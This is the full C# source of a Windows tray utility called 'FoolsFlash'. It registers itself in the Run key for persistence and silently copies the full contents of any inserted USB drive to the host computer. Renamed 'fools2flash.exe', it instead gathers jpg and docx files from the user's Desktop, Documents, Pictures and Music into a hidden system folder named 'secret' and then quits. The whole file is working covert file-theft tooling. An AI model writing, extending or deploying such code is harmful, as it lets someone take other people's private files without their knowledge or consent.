using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace FoolsFlash
{
    public partial class frmMain : Form
    {
        string source, target;
        bool useBalloon;
        bool avoidViruses;

        public frmMain()
        {
            InitializeComponent();
            if (Path.GetFileName(Application.ExecutablePath).ToLower() == "fools2flash.exe")
            {
                notyIcon.Visible = false;
                thrd2flash.RunWorkerAsync();
            }
            else
            {
                useBalloon = Settings1.Default.Balloon;
                avoidViruses = Settings1.Default.Avoid;
                target = Settings1.Default.Location;
                regRun(Application.ExecutablePath, true);
                if (string.IsNullOrEmpty(target))
                {
                    target = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                    Settings1.Default.Location = target;
                    Settings1.Default.Save();

                }

            }

        }

        private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs, bool avoidvir = false)
        {
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            DirectoryInfo[] dirs = dir.GetDirectories();

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Source directory does not exist or could not be found: "
                    + sourceDirName);
            }

            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.CopyTo(temppath, false);
            }

            if (copySubDirs)
            {
                foreach (DirectoryInfo subdir in dirs)
                {
                    if (avoidvir && (subdir.Name.ToLower().Equals("system volume information") || subdir.Name.ToLower().Equals("$recycle.bin") || subdir.Name.ToLower().Equals("recycler") || subdir.Name.ToLower().Equals("usb 2.0 driver")))
                        continue;
                    string temppath = Path.Combine(destDirName, subdir.Name);
                    DirectoryCopy(subdir.FullName, temppath, copySubDirs);
                }
            }
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (useBalloon)
                chkBaloon.Checked = true;
            if (avoidViruses)
                chkAvoid.Checked = true;
            txtLocation.Text = target;
            this.Show();
        }

        private void tmrChk_Tick(object sender, EventArgs e)
        {

            foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
            {
                if (driveInfo.DriveType == DriveType.Removable)
                {
                    if (driveInfo.IsReady)
                    {
                        if (Directory.Exists(target + "\\" + driveInfo.VolumeLabel + "_" + driveInfo.TotalFreeSpace.ToString()))
                            continue;
                        Directory.CreateDirectory(target + "\\" + driveInfo.VolumeLabel + "_" + driveInfo.TotalFreeSpace.ToString());
                        source = driveInfo.Name;
                        target = target + "\\" + driveInfo.VolumeLabel + "_" + driveInfo.TotalFreeSpace.ToString();
                        thrdCopy.RunWorkerAsync();
                    }
                }
            }


        }

        private void thrdCopy_DoWork(object sender, DoWorkEventArgs e)
        {
            tmrChk.Enabled = false;
            if (useBalloon)
            {
                notyIcon.BalloonTipTitle = "Working...";
                notyIcon.BalloonTipText = "Have fun.";
                notyIcon.ShowBalloonTip(3000);
            }
            DirectoryCopy(source, target, true, avoidViruses);
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        public static void regRun(string App_path, bool r)
        {
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            try
            {
                if (r)
                    key.SetValue("FoolsFlash", App_path);
                else
                    key.DeleteValue("FoolsFlash");
            }
            catch { }
            key.Close();
        }

        private void thrdCopy_WorkCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            tmrChk.Enabled = true;
            if (useBalloon)
            {
                notyIcon.BalloonTipTitle = "Done!";
                notyIcon.BalloonTipText = "Congratulations.";
                notyIcon.ShowBalloonTip(3000);
            }
            target = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        }

        private void autoRunToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (autoRunToolStripMenuItem.Checked == true)
            {
                regRun("", false);
                autoRunToolStripMenuItem.Checked = false;
            }
            else
            {
                regRun(Application.ExecutablePath, true);
                autoRunToolStripMenuItem.Checked = true;
            }
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            this.Hide();
            target = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        }

        private void btnOK_Click(object sender, EventArgs e)
        {
            if (Directory.Exists(txtLocation.Text))
            {
                target = txtLocation.Text;
                Settings1.Default.Location = target;
                this.Hide();
            }
            else
                MessageBox.Show("The directory does not exist", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

            Settings1.Default.Save();
            //Settings1.Default.Upgrade();
        }

        private void chkBaloon_CheckedChanged(object sender, EventArgs e)
        {
            if (chkBaloon.Checked)
            {
                useBalloon = true;
                Settings1.Default.Balloon = true;
            }
            else
            {
                useBalloon = false;
                Settings1.Default.Balloon = false;
            }
        }

        private void chkActivate_CheckedChanged(object sender, EventArgs e)
        {
            if (chkActivate.Checked)
            {
                tmrChk.Enabled = true;
                Settings1.Default.Activate = true;
            }

            else
            {
                tmrChk.Enabled = false;
                Settings1.Default.Activate = false;
            }
        }

        private void btnBrows_Click(object sender, EventArgs e)
        {
            string path;
            folderBrowserDialog1.ShowDialog();
            path = folderBrowserDialog1.SelectedPath;
            if (path != "")
                txtLocation.Text = path;
        }

        private void chkAvoid_CheckedChanged(object sender, EventArgs e)
        {
            if (chkAvoid.Checked)
            {
                avoidViruses = true;
                Settings1.Default.Avoid = true;
            }
            else
            {
                avoidViruses = false;
                Settings1.Default.Avoid = false;
            }
        }

        private void frmMain_Load(object sender, EventArgs e)
        {

        }

        private void thrd2flash_DoWork(object sender, DoWorkEventArgs e)
        {
            System.IO.DirectoryInfo dir;
            if (!File.Exists("Path.txt"))
            {
                string[] pathlist = { Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) };
                File.WriteAllLines("Path.txt", pathlist);

            }
            if (!File.Exists("Extension.txt"))
            {
                string[] extensionlist = { "jpg", "docx" };
                File.WriteAllLines("Extension.txt", extensionlist);

            }
            string[] pathList = File.ReadAllLines("Path.txt");
            string[] extensions = File.ReadAllLines("Extension.txt");
            foreach (string path in pathList)
            {
                if (!Directory.Exists(path))
                    continue;
                dir = new System.IO.DirectoryInfo(path);

                DirectoryInfo d = Directory.CreateDirectory(Environment.CurrentDirectory + "\\secret");
                d.Attributes = FileAttributes.System | FileAttributes.Hidden;
                int i = 0;
                foreach (string exten in extensions)
                {
                    System.IO.FileInfo[] a = dir.GetFiles("*." + exten, System.IO.SearchOption.AllDirectories);
                    foreach (System.IO.FileInfo f in a)
                    {
                        string temppath = Path.Combine(Environment.CurrentDirectory + "\\secret", f.Name);
                        if (!File.Exists(Path.Combine(Environment.CurrentDirectory + "\\secret", f.Name)))
                            f.CopyTo(temppath, false);
                        else
                        {
                            f.CopyTo(temppath + i + "." + exten);
                            i++;
                        }

                    }
                }
            }
        }

        private void thrd2flash_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            Application.Exit();
        }

    }
}
